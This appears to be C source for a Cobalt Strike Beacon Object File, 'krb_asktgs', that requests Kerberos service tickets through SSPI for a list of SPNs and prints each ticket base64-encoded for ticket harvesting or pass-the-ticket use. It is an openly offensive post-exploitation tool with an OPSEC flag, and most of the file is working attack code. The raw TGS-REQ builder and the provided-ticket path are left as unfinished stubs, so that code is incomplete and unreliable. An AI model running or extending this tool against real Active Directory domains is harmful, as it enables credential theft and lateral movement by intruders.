/*
 * krb_asktgs - Request a Service Ticket (TGS)
 *
 * Usage: krb_asktgs /ticket:BASE64 /service:SPN1,SPN2 [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/opsec]
 *        krb_asktgs /ticket:BASE64 /service:SPN /u2u [/tgs:BASE64]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>

/* Build TGS-REQ */
static void build_tgs_req(KRB_BUFFER* out, const BYTE* tgt_data, size_t tgt_len,
                          const char* domain, const char* spn, int enctype) {
    KRB_BUFFER tgsreq, pvno, msg_type, padata, req_body;

    buf_init(&tgsreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 2048);
    buf_init(&req_body, 1024);

    /* pvno [1] INTEGER (5) */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&tgsreq, 1, &pvno);

    /* msg-type [2] INTEGER (12 = TGS-REQ) */
    asn1_encode_integer(&msg_type, KRB5_TGS_REQ);
    asn1_context_wrap(&tgsreq, 2, &msg_type);

    /* padata [3] - PA-TGS-REQ containing AP-REQ with TGT */
    /* This would need the authenticator encrypted with session key */

    /* req-body [4] KDC-REQ-BODY with service principal */
    /* Build similar to AS-REQ but with sname = service principal */


    KRB_BUFFER seq_wrap;
    buf_init(&seq_wrap, tgsreq.length + 8);
    asn1_wrap(&seq_wrap, ASN1_SEQUENCE, &tgsreq);

    buf_append_byte(out, ASN1_APP(KRB5_TGS_REQ));
    asn1_encode_length(out, seq_wrap.length);
    buf_append(out, seq_wrap.data, seq_wrap.length);

    buf_free(&seq_wrap);
    buf_free(&tgsreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
}

/* Request TGS using SSPI (recommended approach) */
static int request_tgs_sspi(const char* spn, formatp* output, bool ptt) {
    SECURITY_STATUS ss;
    CredHandle credHandle;
    CtxtHandle ctxHandle;
    TimeStamp expiry;
    SecBufferDesc outDesc;
    SecBuffer outBuf;
    ULONG ctxAttr;

    /* Acquire credentials for current user */
    ss = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
                                            NULL, NULL, NULL, NULL, &credHandle, &expiry);
    if (ss != SEC_E_OK) {
        BeaconFormatPrintf(output, "[-] AcquireCredentialsHandle failed: 0x%08X\n", ss);
        return 0;
    }

    outBuf.cbBuffer = 0;
    outBuf.BufferType = SECBUFFER_TOKEN;
    outBuf.pvBuffer = NULL;
    outDesc.ulVersion = SECBUFFER_VERSION;
    outDesc.cBuffers = 1;
    outDesc.pBuffers = &outBuf;

    ss = SECUR32$InitializeSecurityContextA(&credHandle, NULL, (LPSTR)spn,
                                             ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
                                             0, SECURITY_NATIVE_DREP, NULL, 0,
                                             &ctxHandle, &outDesc, &ctxAttr, &expiry);

    if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
        BeaconFormatPrintf(output, "[+] TGS request successful for %s!\n", spn);

        if (outBuf.cbBuffer > 0 && outBuf.pvBuffer) {
            size_t b64_len = ((outBuf.cbBuffer + 2) / 3) * 4 + 1;
            char* b64 = (char*)malloc(b64_len);
            if (b64) {
                base64_encode((BYTE*)outBuf.pvBuffer, outBuf.cbBuffer, b64);
                BeaconFormatPrintf(output, "[*] Ticket size: %d bytes\n", outBuf.cbBuffer);
                BeaconFormatPrintf(output, "[*] Base64 encoded service ticket:\n\n%s\n\n", b64);

                if (ptt) {
                    BeaconFormatPrintf(output, "[*] Ticket applied via SSPI\n");
                }
                free(b64);
            }
            SECUR32$FreeContextBuffer(outBuf.pvBuffer);
        }
        SECUR32$DeleteSecurityContext(&ctxHandle);
        SECUR32$FreeCredentialsHandle(&credHandle);
        return 1;
    }

    BeaconFormatPrintf(output, "[-] InitializeSecurityContext failed: 0x%08X\n", ss);
    if (ss == SEC_E_TARGET_UNKNOWN) {
        BeaconFormatPrintf(output, "[-] Target SPN not found in domain\n");
    }

    SECUR32$FreeCredentialsHandle(&credHandle);
    return 0;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* ticket_b64 = arg_get(&parser, "ticket");
    char* service = arg_get(&parser, "service");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");
    char* tgs_b64 = arg_get(&parser, "tgs");
    char* targetdomain = arg_get(&parser, "targetdomain");
    char* targetuser = arg_get(&parser, "targetuser");
    char* enctype_str = arg_get(&parser, "enctype");
    bool ptt = arg_exists(&parser, "ptt");
    bool u2u = arg_exists(&parser, "u2u");
    bool keylist = arg_exists(&parser, "keylist");
    bool opsec = arg_exists(&parser, "opsec");

    if (!service) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_asktgs /service:SPN [/ticket:BASE64] [/domain:DOMAIN] [/dc:DC] [/ptt]");
        BeaconPrintf(CALLBACK_ERROR, "       krb_asktgs /service:SPN1,SPN2 /ticket:BASE64 [/enctype:rc4|aes256]");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Action: Ask TGS\n");
    BeaconFormatPrintf(&output, "[*] Service(s): %s\n", service);
    if (domain) BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    if (u2u) BeaconFormatPrintf(&output, "[*] User-to-User (U2U) mode enabled\n");
    if (opsec) BeaconFormatPrintf(&output, "[*] OPSEC mode enabled\n");
    BeaconFormatPrintf(&output, "\n");


    char* spn_list = (char*)malloc(strlen(service) + 1);
    strcpy(spn_list, service);

    char* spn = spn_list;
    char* next_spn;
    int count = 0;

    while (spn && *spn) {
        /* Find next comma */
        next_spn = strchr(spn, ',');
        if (next_spn) {
            *next_spn = '\0';
            next_spn++;
        }

        /* Trim whitespace */
        while (*spn == ' ') spn++;

        if (*spn) {
            count++;
            BeaconFormatPrintf(&output, "[*] Requesting TGS for SPN %d: %s\n", count, spn);

            if (ticket_b64) {
                /* Use provided TGT ticket - would need full implementation */
                BeaconFormatPrintf(&output, "[*] Using provided TGT ticket...\n");
                /* Decode ticket, build TGS-REQ, send to KDC */
                BeaconFormatPrintf(&output, "[!] Raw TGS-REQ with provided ticket requires full implementation\n");
                BeaconFormatPrintf(&output, "[*] Falling back to SSPI...\n\n");
            }

            /* Use SSPI for TGS request */
            request_tgs_sspi(spn, &output, ptt);
            BeaconFormatPrintf(&output, "\n");
        }

        spn = next_spn;
    }

    free(spn_list);
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (ticket_b64) free(ticket_b64);
    if (service) free(service);
    if (domain) free(domain);
    if (dc) free(dc);
    if (tgs_b64) free(tgs_b64);
    if (targetdomain) free(targetdomain);
    if (targetuser) free(targetuser);
    if (enctype_str) free(enctype_str);
}
